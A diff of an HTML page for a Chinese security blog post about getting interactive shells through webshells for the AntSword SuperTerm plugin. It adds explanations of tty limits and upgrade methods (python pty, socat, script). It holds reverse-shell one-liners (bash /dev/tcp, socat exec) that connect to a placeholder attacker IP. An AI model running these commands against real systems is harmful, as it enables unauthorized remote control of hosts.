@@ -47,7 +47,7 @@
 <meta property="og:url" content="http://blog.evalbug.com/2018/07/25/antsword_prompt_shell/index.html">
 <meta property="og:site_name" content="Medici.Yan's Blog">
 <meta property="og:description" content="瞎折腾，开新坑，两年前计划在 AntSword 上做的东西，利用WebShell创建交互式终端，现在基本有个雏形了。">
-<meta property="og:updated_time" content="2018-07-25T06:33:02.000Z">
+<meta property="og:updated_time" content="2018-07-26T17:07:57.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WebShell下的交互式Shell">
 <meta name="twitter:description" content="瞎折腾，开新坑，两年前计划在 AntSword 上做的东西，利用WebShell创建交互式终端，现在基本有个雏形了。">
@@ -292,15 +292,50 @@
 <h3 id="反弹-Shell-执行命令"><a href="#反弹-Shell-执行命令" class="headerlink" title="反弹 Shell 执行命令"></a>反弹 Shell 执行命令</h3><p>后来，有了利用 <code>nc</code> 等工具反弹 shell 这种方式:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/111.111.111.111/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 <p>都知道用 nc 反弹回来的shell交互上多多少少会遇到一些问题，当你输入 <code>tty</code> 命令时，返回的还是 <code>not a tty</code>。虽然已经满足部分需求，但是不能用到 <code>Tab</code>补全,<code>ctrl+L</code>清屏等操作,尤其是<code>ctrl+C</code>,一不小心按下去，<code>nc</code>都结束掉了，又得重新反弹。</p>
-<h3 id="反弹-Shell-中获取交互式-Shell"><a href="#反弹-Shell-中获取交互式-Shell" class="headerlink" title="反弹 Shell 中获取交互式 Shell"></a>反弹 Shell 中获取交互式 Shell</h3><p>在 nc 反弹回来的 shell 中，如果发现对方机器上有 python 的话，那就爽了。</p>
+<h3 id="反弹-Shell-中获取交互式-Shell"><a href="#反弹-Shell-中获取交互式-Shell" class="headerlink" title="反弹 Shell 中获取交互式 Shell"></a>反弹 Shell 中获取交互式 Shell</h3><h4 id="为什么webshell反弹的-shell-无法交互"><a href="#为什么webshell反弹的-shell-无法交互" class="headerlink" title="为什么webshell反弹的 shell 无法交互 ?"></a>为什么webshell反弹的 shell 无法交互 ?</h4><p>我们能清晰的感受到，我在连接一台远程的 Linux 主机的时候，如果我使用的是 ssh 连接目标主机，在连接成功后，我可以使用 Tab 补全命令，可以使用 <code>vim</code>、<code>nano</code>,可以使用<code>top</code>,<code>htop</code>,并且当我按下 <code>Ctrl+C</code>组合按键时，只会结束前台运行的进程，不会结束掉整个 ssh 会话。</p>
+<p>究其原因，是因为没有 <code>tty</code> 这么个东西。当然，<code>tty</code>,<code>pty</code>,<code>pts</code>,<code>ptmx</code>,<code>console</code> 这几者有什么区别，有兴趣的读者可以自行查阅相关资料，这里不再深讲，也可以看一下下面这一篇文章：<a href="http://www.linusakesson.net/programming/tty/" target="_blank" rel="external">The TTY demystified</a> 译文：<a href="http://www.cnblogs.com/liqiuhao/p/9031803.html" target="_blank" rel="external">解密TTY</a></p>
+<p>总结下来就是，我们提到的这些个命令，在执行的时候，需要获取当前上下文环境中的 tty, 并根据 tty 的大小，来处理输出和输出。而脚本语言默认执行系统命令时，是没有获取 tty 的。</p>
+<p>那么有没有办法反弹交互式 shell 回来呢？当然有了</p>
+<h4 id="python-pty-方式"><a href="#python-pty-方式" class="headerlink" title="python pty 方式"></a>python pty 方式</h4><p>在 nc 反弹回来的 shell 中，如果发现对方机器上有 python 的话，那就爽了。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;__import__(&quot;pty&quot;).spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
 <p>这种方式可以得到一个交互式的 Shell，确实方便了许多。</p>
 <p>虽说绝大多数 Linux 下都有 python 环境，那么如果对方没有 <code>python</code> 的时候呢？比如说容器？</p>
-<h2 id="AntSwrod-SuperTerm-插件"><a href="#AntSwrod-SuperTerm-插件" class="headerlink" title="AntSwrod SuperTerm 插件"></a>AntSwrod SuperTerm 插件</h2><p>先看演示视频：</p>
+<p>当然了，除了上面说的这种方式，如果目标有 python 的情况下，我们还可以使用 SSTIC 2018 上公开的开源工具 FFM 来增强反弹回来的 shell。</p>
+<p>FFM 项目地址：<a href="https://github.com/JusticeRage/FFM" target="_blank" rel="external">https://github.com/JusticeRage/FFM</a></p>
+<p>FFM 演示 PPT: <a href="http://manalyzer.org/static/talks/SSTIC2018.pptx" target="_blank" rel="external">http://manalyzer.org/static/talks/SSTIC2018.pptx</a></p>
+<blockquote>
+<p>PPT 里面有操作的视频，感兴趣的同学可以下载了看一下</p>
+</blockquote>
+<h4 id="socat-反弹真正交互式的-Shell"><a href="#socat-反弹真正交互式的-Shell" class="headerlink" title="socat 反弹真正交互式的 Shell"></a>socat 反弹真正交互式的 Shell</h4><p>socat是类Unix系统下的一个工具，可以看作是 nc 的加强版。我们可以使用socat来传递完整的带有tty的TCP连接。</p>
+<blockquote>
+<p>说个题外话，在 CTF PWN 题目布署的时候，可以使用 socat 来将题目的输入输出转到网络接口上</p>
+</blockquote>
+<p>直接说下怎么使用吧，虽然网上教程一抓一大把：</p>
+<p>step1:在 vps 上监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ socat file:`tty`,raw,echo=0 tcp-listen:9999</span><br></pre></td></tr></table></figure>
+<p>step2:把socat上传到目标机器上，然后执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:111.111.111.111:9999</span><br></pre></td></tr></table></figure>
+<p>就可以得到一个完整的交互式shell了，非常方便。</p>
+<p>有关反弹 shell 中获取交互式Shell的方法，有兴趣的朋友可以看一下这篇博文：<br><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="_blank" rel="external">Upgrading simple shells to fully interactive TTYs</a>，英文不好的同学也可以参考一下译文:<a href="http://www.4hou.com/technology/6248.html" target="_blank" rel="external">将简单的shell升级为完全交互式的TTY</a></p>
+<h4 id="script-获取-pty"><a href="#script-获取-pty" class="headerlink" title="script 获取 pty"></a>script 获取 pty</h4><p>我们可以使用 Linux 系统下的 <code>script</code> 命令，在弹回来的 shell 下创建一个带有 tty 的 shell, 这样就可以勉强使用一下 <code>top</code> 和 <code>vim</code> 了:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ script /dev/null</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果不加 <code>/dev/null</code> 的话，会在当前路径下生成一个名字是 <code>typescript</code> 的文件，记录着在 script 生命周期里你执行的所有命令和结果。</p>
+</blockquote>
+<p>呐，下面是执行之后的结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜ nc -lv 9999</span><br><span class="line">root@46958b799745:/tmp# tty</span><br><span class="line">tty</span><br><span class="line">not a tty</span><br><span class="line">root@46958b799745:/tmp# script /dev/null</span><br><span class="line">script /dev/null</span><br><span class="line"># tty</span><br><span class="line">tty</span><br><span class="line">/dev/pts/1</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+<h4 id="MSF-staekka-Module-获取交互式-shell-未测试"><a href="#MSF-staekka-Module-获取交互式-shell-未测试" class="headerlink" title="MSF staekka Module 获取交互式 shell(未测试)"></a>MSF staekka Module 获取交互式 shell(未测试)</h4><p>我在查阅资料的时候顺便发现了有个兄弟为 msf 写了一个交互shell的模块，由于时间关系，也没测试，留给有兴趣的朋友去研究啦。</p>
+<p><a href="https://github.com/j-0-t/staekka" target="_blank" rel="external">staekka</a></p>
+<h2 id="AntSwrod-SuperTerm-插件演示"><a href="#AntSwrod-SuperTerm-插件演示" class="headerlink" title="AntSwrod SuperTerm 插件演示"></a>AntSwrod SuperTerm 插件演示</h2><blockquote>
+<p>下面是我们这篇文章的主角了,为了快速说明来意，我先放两个演示的视频</p>
+</blockquote>
+<p>先看演示视频：</p>
+<p>看不了的话，点原始链接：<a href="http://v.youku.com/v_show/id_XMzc0MzgzOTU1Mg==.html?firsttime=0" target="_blank" rel="external">AntSword SuperTerm 交互式终端</a></p>
 <embed src="http://player.youku.com/player.php/sid/XMzc0MzgzOTU1Mg==/v.swf" allowfullscreen="true" quality="high" width="510" height="500" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">
 
 
-<h2 id="SuperTerm-内网穿透"><a href="#SuperTerm-内网穿透" class="headerlink" title="SuperTerm 内网穿透"></a>SuperTerm 内网穿透</h2><p>在内网穿透方面，演示环境里，hacker 和 victim 双方均处在自己的 nat 后面，也是比较常见的场景了：</p>
+<h2 id="SuperTerm-内网穿透演示"><a href="#SuperTerm-内网穿透演示" class="headerlink" title="SuperTerm 内网穿透演示"></a>SuperTerm 内网穿透演示</h2><p>在内网穿透方面，演示环境里，hacker 和 victim 双方均处在自己的 nat 后面，也是比较常见的场景了：</p>
+<p>看不了的话，点原始链接：<a href="http://v.youku.com/v_show/id_XMzc0MzQyMjY4NA==.html?firsttime=0" target="_blank" rel="external">AntSword SuperTerm 内网穿透</a></p>
 <embed src="http://player.youku.com/player.php/sid/XMzc0MzQyMjY4NA==/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">
 
 
@@ -482,7 +517,7 @@
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#从webshell执行命令现状说起"><span class="nav-number">1.</span> <span class="nav-text">从webshell执行命令现状说起</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web-脚本中执行命令"><span class="nav-number">1.1.</span> <span class="nav-text">web 脚本中执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹-Shell-执行命令"><span class="nav-number">1.2.</span> <span class="nav-text">反弹 Shell 执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹-Shell-中获取交互式-Shell"><span class="nav-number">1.3.</span> <span class="nav-text">反弹 Shell 中获取交互式 Shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AntSwrod-SuperTerm-插件"><span class="nav-number">2.</span> <span class="nav-text">AntSwrod SuperTerm 插件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SuperTerm-内网穿透"><span class="nav-number">3.</span> <span class="nav-text">SuperTerm 内网穿透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#从webshell执行命令现状说起"><span class="nav-number">1.</span> <span class="nav-text">从webshell执行命令现状说起</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web-脚本中执行命令"><span class="nav-number">1.1.</span> <span class="nav-text">web 脚本中执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹-Shell-执行命令"><span class="nav-number">1.2.</span> <span class="nav-text">反弹 Shell 执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹-Shell-中获取交互式-Shell"><span class="nav-number">1.3.</span> <span class="nav-text">反弹 Shell 中获取交互式 Shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#为什么webshell反弹的-shell-无法交互"><span class="nav-number">1.3.1.</span> <span class="nav-text">为什么webshell反弹的 shell 无法交互 ?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python-pty-方式"><span class="nav-number">1.3.2.</span> <span class="nav-text">python pty 方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#socat-反弹真正交互式的-Shell"><span class="nav-number">1.3.3.</span> <span class="nav-text">socat 反弹真正交互式的 Shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#script-获取-pty"><span class="nav-number">1.3.4.</span> <span class="nav-text">script 获取 pty</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MSF-staekka-Module-获取交互式-shell-未测试"><span class="nav-number">1.3.5.</span> <span class="nav-text">MSF staekka Module 获取交互式 shell(未测试)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AntSwrod-SuperTerm-插件演示"><span class="nav-number">2.</span> <span class="nav-text">AntSwrod SuperTerm 插件演示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SuperTerm-内网穿透演示"><span class="nav-number">3.</span> <span class="nav-text">SuperTerm 内网穿透演示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
